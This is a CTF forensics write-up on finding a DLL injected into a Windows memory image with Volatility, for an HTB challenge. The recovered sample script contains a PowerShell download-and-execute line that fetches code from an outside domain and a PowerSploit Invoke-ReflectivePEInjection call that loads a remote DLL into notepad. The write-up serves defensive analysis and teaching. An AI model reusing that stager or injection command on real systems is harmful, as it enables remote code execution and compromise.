remnux@remnux:~/ctf/cyber-apocalypse/forensics_reflection/autoVolatility$ vol.py -f memory.raw --profile=Win7SP1x86_23418 filescan | grep update.ps1
Volatility Foundation Volatility Framework 2.6.1
/usr/local/lib/python2.7/dist-packages/volatility/plugins/community/YingLi/ssh_agent_key.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends.openssl import backend
0x000000003f4551c0      8      0 R--r-- \Device\HarddiskVolume1\Windows\security\update.ps1
remnux@remnux:~/ctf/cyber-apocalypse/forensics_reflection/autoVolatility$ vol.py -f memory.raw --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003f4551c0 --dump-dir=.
Volatility Foundation Volatility Framework 2.6.1
/usr/local/lib/python2.7/dist-packages/volatility/plugins/community/YingLi/ssh_agent_key.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends.openssl import backend
DataSectionObject 0x3f4551c0   None   \Device\HarddiskVolume1\Windows\security\update.ps1
remnux@remnux:~/ctf/cyber-apocalypse/forensics_reflection/autoVolatility$ ls -la file.None.0x85bf45c8.dat 
-rw-rw-r-- 1 remnux remnux 4096 May 19 18:58 file.None.0x85bf45c8.dat
remnux@remnux:~/ctf/cyber-apocalypse/forensics_reflection/autoVolatility$ cat file.None.0x85bf45c8.dat 
iex (New-Object net.webclient).Downloadstring('https://windowsliveupdater.com/sysdriver.ps1');
Invoke-ReflectivePEInjection -PEUrl https://windowsliveupdater.com/winmgr.dll -ProcName notepad
```

Well, well, well. It appears we've finally found the bad thing. `windowsliveupdater.com` is not a real Microsoft domain, it's actually owned by one of the HTB staff, maklaris, and simply redirects to a Rick Roll. But, here it's been used to host a `sysdriver.ps1` file which has probably been executed in memory, and the cmdlet `Invoke-ReflectivePEInjection` has been run. Some googling shows that it's part of the [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1) suite of tools. 

#### Aside: What is Reflective DLL Injection?
> Warning: Windows Internals content ahead.

Windows is complicated, so there are a lot of TTPs out there that do very seemingly complex things if you don't know the OS very well. I'm going to explain this at a high-level, but I encourage you to do more reading if you want to learn more about some things that are super important to the DFIR and red teaming space.

Recall that DLL stands for "Dynamic Link Library", and functions in the similar way that a shared object (`.so`) file in Linux does, that is, it contains a library of functions for a `.exe` file to import and pull from. For a DLL to be used, it must be parsed by a loader, which will then execute functions based on the DLL main function, which differs from a normal main function in an executable file.

**DLL Injection** (not reflective), is where we take a DLL on-disk, and inject it into the running memory of another process. Here, we need our DLL to be parsed by the loader, so we allocate memory in the target process and drop in the path to the DLL we want to load, so that we can eventually call something like `CreateRemoteThread` to execute some function in the DLL while that other process is still running. **Reflective DLL injection** differs in that we are loading the DLL from memory, where it is not on the disk. We make use of the ReflectiveLoader function and do some memory gymnastics to get similar results, except there is very little evidence of the DLL having ever entered the system.

For further reading/viewing, you should check out [ired.team](https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection) and [Sektor7](https://www.youtube.com/watch?v=4mYhffBsGeY).

From our perspective, the analyst's perspective, reflective DLL injection means that we are not going to find this malicious DLL on disk. We can run all of the scans we want, we're just not going to find it. The best resource I found to sum up this idea are the slides from [this](https://paper.bobylive.com/Meeting_Papers/BlackHat/Europe-2019/eu-19-Block-Detecting-Un-Intentionally-Hidden-Injected-Code-By-Examining-Page-Table-Entries.pdf) BlackHat conference where they talk about the detection of this. The main point I want to reiterate from this talk is what they cite as the "Rootkit Paradox":

> "*In Essence: While the rootkit tries to hide its existence, in order to do nasty stuff, its
code must (at least once) be locatable and executable*" (paraphrasing [this](https://www.semanticscholar.org/paper/Exploiting-the-Rootkit-Paradox-with-Windows-Memory-Kornblum/dd7986995b903a9c1ba16e228f6debfc3cf539cc?p2df) paper)

While we're not dealing with a rootkit, the point still stands. Although reflective DLL injection can be pretty evasive, there is some thread we have to be able to pull so that the OS knows that it's there. Otherwise, it's dead space.

### The Search Continues - Failure
This is point where I got stuck and couldn't really progress. Normally, I'd use something like the `malfind` plugin to locate the dll, but I wasn't seeing the MZ magic bytes (at the top of every PE file). Knowing that the DLL was injected into `notepad`, I can dump the process executable and memory using `procdump` and `memdump`.
```shell
remnux@remnux:~/ctf/cyber-apocalypse/forensics_reflection/autoVolatility$ vol.py -f memory.raw --profile=Win7SP1x86_23418 procdump -p 3244 -D .
Volatility Foundation Volatility Framework 2.6.1
/usr/local/lib/python2.7/dist-packages/volatility/plugins/community/YingLi/ssh_agent_key.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends.openssl import backend
Process(V) ImageBase  Name                 Result
---------- ---------- -------------------- ------
0x85bf4d28 0x007c0000 notepad.exe          OK: executable.3244.exe
remnux@remnux:~/ctf/cyber-apocalypse/forensics_reflection/autoVolatility$ vol.py -f memory.raw --profile=Win7SP1x86_23418 memdump -p 3244 -D .
Volatility Foundation Volatility Framework 2.6.1
/usr/local/lib/python2.7/dist-packages/volatility/plugins/community/YingLi/ssh_agent_key.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends.openssl import backend
************************************************************************
Writing notepad.exe [  3244] to 3244.dmp
```

I'll start by examining the memory dump using `xxd`. We know, based on the `update.ps1` script, that the file is likely called `winmgr.dll` or something similar. However, we should also keep an open mind in case the name somehow changes in the middle because of decoupling strategies. I can pipe the output of `xxd` to `less`, and I'll find this after searching for the `winmgr` string.

```shell
00017060: 0000 7769 6e6d 6772 5f78 3836 2e64 6c6c  ..winmgr_x86.dll
00017070: 0056 6f69 6446 756e 6300 0000 0000 0000  .VoidFunc.......
00017080: 0010 0000 7802 0000 2e74 6578 7424 6d6e  ....x....text$mn
00017090: 0000 0000 0020 0000 0c00 0000 2e69 6461  ..... .......ida
000170a0: 7461 2435 0000 0000 0c20 0000 2400 0000  ta$5..... ..$...
000170b0: 2e72 6461 7461 0000 3020 0000 4c00 0000  .rdata..0 ..L...
000170c0: 2e65 6461 7461 0000 7c20 0000 b400 0000  .edata..| ......
000170d0: 2e72 6461 7461 247a 7a7a 6462 6700 0000  .rdata$zzzdbg...
000170e0: 3021 0000 1400 0000 2e69 6461 7461 2432  0!.......idata$2
000170f0: 0000 0000 4421 0000 1400 0000 2e69 6461  ....D!.......ida
00017100: 7461 2433 0000 0000 5821 0000 0c00 0000  ta$3....X!......
00017110: 2e69 6461 7461 2434 0000 0000 6421 0000  .idata$4....d!..
00017120: 2000 0000 2e69 6461 7461 2436 0000 0000   ....idata$6....
00017130: 5821 0000 0000 0000 0000 0000 7621 0000  X!..........v!..
00017140: 0020 0000 0000 0000 0000 0000 0000 0000  . ..............
00017150: 0000 0000 0000 0000 6c21 0000 6421 0000  ........l!..d!..
00017160: 0000 0000 8105 536c 6565 7000 0306 5769  ......Sleep...Wi
00017170: 6e45 7865 6300 4b45 524e 454c 3332 2e64  nExec.KERNEL32.d
00017180: 6c6c 0000 0000 0000 0000 0000 0000 0000  ll..............
```
Although the magic bytes still aren't here, observe the various headers like `.text` and `.data`, both of which apply to PE files. When solving this during the CTF, I actually found this exact slice, but dismissed it because it didn't look entirely like a DLL, but there are more reasons why this makes sense to be our target.
- `WinExec` is typically used to execute commands, which doesn't really make sense to be used in notepad like this, but does make sense for malware.
- Originally, I dismissed this for being too small, but in fact, this is one of the reasons I should have looked at this further. It would make sense for a threat actor to keep their payload smaller to minimize the detection surface, and with how sparse this DLL is, things just seem more suspicious.

Another one of my many faults when looking at this during the CTF was not realizing that the DLL headers are with this, they're not just random bytes related to the DLL. We can scroll up to find the relevant DOS header, but we're just lacking the magic MZ bytes.
```shell
00015040: 0e1f ba0e 00b4 09cd 21b8 014c cd21 5468  ........!..L.!Th
00015050: 6973 2070 726f 6772 616d 2063 616e 6e6f  is program canno
00015060: 7420 6265 2072 756e 2069 6e20 444f 5320  t be run in DOS 
00015070: 6d6f 6465 2e0d 0d0a 2400 0000 0000 0000  mode....$.......
00015080: 812d 03c5 c54c 6d96 c54c 6d96 c54c 6d96  .-...Lm..Lm..Lm.
00015090: d127 6c97 c64c 6d96 c54c 6c96 c74c 6d96  .'l..Lm..Ll..Lm.
000150a0: 9339 6997 c44c 6d96 9339 6d97 c44c 6d96  .9i..Lm..9m..Lm.
000150b0: 9339 6f97 c44c 6d96 5269 6368 c54c 6d96  .9o..Lm.Rich.Lm.
```

This really isn't that big of an issue, all we have to do is add them back in. I'll use [this](https://serverfault.com/questions/406791/linux-command-to-retrieve-a-byte-range-from-a-file) StackExchange post to help me write a Python script to extract the bytes, because this hexdump is large. I'll calculate the the beginning and end, and dial them in by comparing the beginning to a normal DLL so I can make sure something like `ghidra` can read it.

```python
#!/usr/bin/env python3

f=open("3244.dmp","rb")
o=open("output.dll", "wb")
f.seek(0x00015040)
missing = b"\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd0\x00\x00\x00" # normal header, stolen from normal dll
o.write(missing)
o.write(f.read(3050-len(missing)))
f.close()
o.close()
```

If I check how my `output.dll` is doing, we see that it looks pretty normal.
```shell
remnux@remnux:~/ctf/cyber-apocalypse/forensics_reflection/autoVolatility/main/memdump$ file output.dll
output.dll: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
```

Unlike the previous challenge, this one is not .NET, meaning it'll probably be harder to recover a full original code. However, we can stick it in ghidra and hope all goes well.

![asdf](https://an00brektn.github.io/img/htb-cyber-apocalypse-22/Pasted image 20220520015453.png)

Unfortunately, it doesn't. Ghidra doesn't like the fact that there are so many null bytes so the file just gets treated as a DLL with literally nothing in it. I tried to remove the null bytes too just until it "felt right", but even that wasn't working.

### The Search Ends - Grabbing The Flag
After consulting some people afterward, I found that, because of the paging at play here, I should have been using the `vaddump` plugin to investigate the Powershell process. I won't explain everything about it because this has already been dragged on long enough, but I'll link you to [this Andrea Fortuna](https://andreafortuna.org/2017/07/10/volatility-my-own-cheatsheet-part-3-process-memory/) cheatsheet highlighting some basic usage, and [this blog](https://resources.infosecinstitute.com/topic/finding-enumerating-processes-within-memory-part-2/) explaining what VAD is. To keep it very, very simple, `vaddump` will show up cleaner because it specifically looks at the VAD tree, which is a data structure that keeps track of various pages in memory. I'm checking Powershell not only because Goomba/st4ckh0und on the HTB discord said so, but because it makes more sense to check Powershell as that is the thing injecting the DLL, and is more likely to contain all of the bytes, properly.

#### Update - 5/20/22
So apparently I've gotten a few things wrong with my explanation, and even the author of the challenge also had a misconception that [Goomba/st4ckh0und](https://github.com/st4ckh0und) explained this morning/last night, and I thought it was worth interrupting this explanation to clarify some things up to this point.
- (1) So, the memory dump approach actually does work if you use something like IDA. The reason `vaddump` works more nicely is because we're dumping the virtual pages (which are aligned on a page boundary). When a PE file is loaded from disk, the in-file sections are written to these virtual pages, which is why the `vaddump` requires much less cleanup work.
	- When you dump it from memory like we were doing, we're getting the raw binary data, as opposed to the desired PE file in it's regular structure.
	- In conclusion, `memdump` still works, but you're not actually dumping the DLL, you're getting raw binary data as opposed to the full file. Hence, we see all of the null bytes in the middle that wouldn't normally be there.
	- According to the author (thewildspirit), using `dlldump` with the `--force` option would have retrieved it despite the DLL not being present in the PEB list (due to how it was loaded, but I haven't tested it, nor do I really plan to because it's already taken me long enough to do this once :)
- (2) `Invoke-ReflectivePEInjection`, the Powershell Script that injected the DLL, doesn't *actually* do reflective DLL injection. I'll let the screenshot explain.

![asdf](https://an00brektn.github.io/img/htb-cyber-apocalypse-22/Pasted image 20220520153249.png)

It might seem overkill to draw that line, but obviously each method has different symptoms that will change exactly what you need to hunt for. This distinction is likely the reason it wasn't easily discoverable by the `malfind` (or similar) plugin, as it wasn't *actually* reflective, as many of the examples I was looking at online were able to use `malfind`/`malfinddeep`/etc. to locate the exact location.

Hopefully by this point, I've covered all of my bases and I'm more correct about stuff than I was before. If not, feel free to reach out and clarify. Back to your normally scheduled programming.

### Back to the Lab Again
I'll start by hunting down which of my vaddumps have the DLL inside it by running a quick one-liner.
```shell
remnux@remnux:~/ctf/cyber-apocalypse/forensics_reflection/autoVolatility/main/vaddump/pwsh$ find . | while read line; do echo $line"--------------------------------------------------------------------------"; strings -a -t x $line | grep winmgr_x86.dll; done
```

I get two files back from it, and I'll start with the one with the most occurences of the string, `powershell.exe.3e74e488.0x01b20000-0x03b1ffff.dmp`. I'll use `xxd` to identify where exactly the DLL might be, based on the offsets identified by strings. 

```shell
0022ec60: 0000 7120 0000 0000 7769 6e6d 6772 5f78  ..q ....winmgr_x
0022ec70: 3836 2e64 6c6c 0056 6f69 6446 756e 6300  86.dll.VoidFunc.
0022ec80: 0000 0000 0000 0010 0000 7802 0000 2e74  ..........x....t
0022ec90: 6578 7424 6d6e 0000 0000 0020 0000 0c00  ext$mn..... ....
0022eca0: 0000 2e69 6461 7461 2435 0000 0000 0c20  ...idata$5..... 
0022ecb0: 0000 2400 0000 2e72 6461 7461 0000 3020  ..$....rdata..0 
0022ecc0: 0000 4c00 0000 2e65 6461 7461 0000 7c20  ..L....edata..| 
0022ecd0: 0000 b400 0000 2e72 6461 7461 247a 7a7a  .......rdata$zzz
0022ece0: 6462 6700 0000 3021 0000 1400 0000 2e69  dbg...0!.......i
0022ecf0: 6461 7461 2432 0000 0000 4421 0000 1400  data$2....D!....
0022ed00: 0000 2e69 6461 7461 2433 0000 0000 5821  ...idata$3....X!
0022ed10: 0000 0c00 0000 2e69 6461 7461 2434 0000  .......idata$4..
0022ed20: 0000 6421 0000 2000 0000 2e69 6461 7461  ..d!.. ....idata
0022ed30: 2436 0000 0000 5821 0000 0000 0000 0000  $6....X!........
0022ed40: 0000 7621 0000 0020 0000 0000 0000 0000  ..v!... ........
0022ed50: 0000 0000 0000 0000 0000 0000 0000 6c21  ..............l!
```

Also note that for this one, the magic bytes are actually there.
```shell
0022e400: 3030 0d0a 0d0a 4d5a 9000 0300 0000 0400  00....MZ........
0022e410: 0000 ffff 0000 b800 0000 0000 0000 4000  ..............@.
0022e420: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0022e430: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0022e440: 0000 d000 0000 0e1f ba0e 00b4 09cd 21b8  ..............!.
0022e450: 014c cd21 5468 6973 2070 726f 6772 616d  .L.!This program
0022e460: 2063 616e 6e6f 7420 6265 2072 756e 2069   cannot be run i
0022e470: 6e20 444f 5320 6d6f 6465 2e0d 0d0a 2400  n DOS mode....$.
```

I'll write another Python script to extract the DLL, tinkering with values until I have it just where I want it.

```python
#!/usr/bin/env python3

f=open("powershell.exe.3e74e488.0x01b20000-0x03b1ffff.dmp","rb")
o=open("output.dll", "wb")
f.seek(0x22e406)
o.write(f.read(3050))
f.close()
o.close()
```
```shell
remnux@remnux:~/ctf/cyber-apocalypse/forensics_reflection/autoVolatility/main/vaddump/pwsh$ file output.dll 
output.dll: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
```

And drum roll for ghidra....
![asdf](https://an00brektn.github.io/img/htb-cyber-apocalypse-22/Pasted image 20220520020923.png)

It worked! We have a clean decompile. Now, if we look at `VoidFunc`, we see many, many single characters/bytes that are eventually concatenated and called by `WinExec`. I'll copy the bytes out into CyberChef, and move them around so that I can decode them to ASCII.

![asdf](https://an00brektn.github.io/img/htb-cyber-apocalypse-22/Pasted image 20220520021139.png)

All that work, for a small encoded powershell command? I'll copy the base64 string and decode it on the command line.
```shell
remnux@remnux:~/ctf/cyber-apocalypse/forensics_reflection/autoVolatility/main/vaddump/pwsh$ echo 'ZQBjAGgAbwAgAEgAVABCAHsAZABsAGwAcwBfAGMANABuAF8AYgAzAF8AaAA0AHIAZABfAHQAMABfAGYAMQBuAGQAfQA=' | base64 -d
echo HTB{dlls_c4n_b3_h4rd_t0_f1nd}
```

I've gotta say, this was the most disappointing result possible, but at least we've done it. I'm pretty sure we all learned something along the way.

Flag: `HTB{dlls_c4n_b3_h4rd_t0_f1nd}`